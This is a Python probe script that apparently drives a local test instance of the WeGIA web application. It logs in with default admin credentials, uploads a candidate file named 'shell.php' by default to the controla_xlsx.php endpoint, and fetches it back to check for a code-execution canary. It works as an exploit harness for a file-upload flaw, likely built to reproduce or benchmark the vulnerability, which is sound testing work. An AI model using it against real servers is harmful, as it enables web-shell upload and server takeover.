#!/usr/bin/env python3
"""Drive REAL WeGIA controla_xlsx.php over HTTP (php:apache + cloned tree).

Logs in as the installer admin, POSTs field 'arquivo' to the product upload
endpoint, then GETs the stored tabelas/ URL. Benign canary read only.
"""
from __future__ import annotations

import base64
import json
import os
import re
import sys
from urllib.parse import unquote

import requests

CPF = "admin"
PW = "wegia"
UPLOAD = "/html/socio/sistema/controller/controla_xlsx.php"
TABELAS = "/html/socio/sistema/tabelas/"
DEFAULT_PORTS = {"v0": 39480, "v1": 39481, "v2": 39482}


def _base_url(version: str) -> str:
    port = os.environ.get("PCB_TARGET_PORT")
    if port:
        return f"http://127.0.0.1:{int(port)}"
    pbt = os.environ.get("PCB_TARGET_BASE")
    if pbt:
        return pbt.rstrip("/")
    return f"http://127.0.0.1:{DEFAULT_PORTS.get(version, 39480)}"


def _payload_bytes(candidate) -> bytes:
    if not isinstance(candidate, dict):
        return b""
    b64 = candidate.get("payload_b64")
    if b64:
        return base64.b64decode(b64)
    p = candidate.get("payload")
    if isinstance(p, bytes):
        return p
    if isinstance(p, str):
        return p.encode("utf-8")
    if isinstance(p, list):
        return bytes(p)
    return b""


def _login(base: str) -> requests.Session:
    s = requests.Session()
    s.headers.update({"User-Agent": "pcb-wegia-probe", "Referer": base + "/html/login.php"})
    r = s.post(
        f"{base}/html/login.php",
        data={"cpf": CPF, "pwd": PW},
        timeout=25,
        allow_redirects=False,
    )
    if "PHPSESSID" not in s.cookies.get_dict() and r.status_code not in (301, 302):
        raise RuntimeError(f"login failed status={r.status_code} body={r.text[:200]}")
    return s


def run_probe(candidate, *, version="v1"):
    base = _base_url(version)
    payload = _payload_bytes(candidate)
    fname = candidate.get("filename", "shell.php") if isinstance(candidate, dict) else "shell.php"
    mode = candidate.get("mode", "plain") if isinstance(candidate, dict) else str(candidate)
    result = {"version": version, "mode": mode, "filename": fname, "base": base}
    try:
        s = _login(base)
        up = s.post(
            f"{base}{UPLOAD}",
            files={"arquivo": (fname, payload, "application/octet-stream")},
            timeout=30,
            allow_redirects=True,
        )
        result["upload_status"] = up.status_code
        body = up.text
        result["upload_body"] = body[:300]
        stored = None
        try:
            j = up.json()
            if isinstance(j, dict) and j.get("resultado") and j.get("url"):
                stored = unquote(str(j["url"]).split("/")[-1])
        except Exception:
            m = re.search(r'"url"\s*:\s*"\.?/?tabelas/([^"]+)"', body)
            if m:
                stored = unquote(m.group(1))
        result["stored_filename"] = stored
        if not stored:
            result["note"] = "upload rejected / no file stored"
            result["fetched_body"] = body[:200]
            return result
        fr = s.get(f"{base}{TABELAS}{stored}", timeout=25)
        result["fetch_status"] = fr.status_code
        fbody = fr.content
        try:
            text = fbody.decode("utf-8", errors="replace")
        except Exception:
            text = fr.text
        idx = text.find("PCBEXEC:")
        result["fetched_body"] = text[idx:idx + 200] if idx >= 0 else text[:200]
        result["body"] = result["fetched_body"]
    except Exception as e:
        result["error"] = f"{type(e).__name__}: {e}"
    return result


if __name__ == "__main__":
    cand = json.load(open(sys.argv[1]))
    version = sys.argv[2] if len(sys.argv) > 2 else "v1"
    print(json.dumps(run_probe(cand, version=version), default=str))
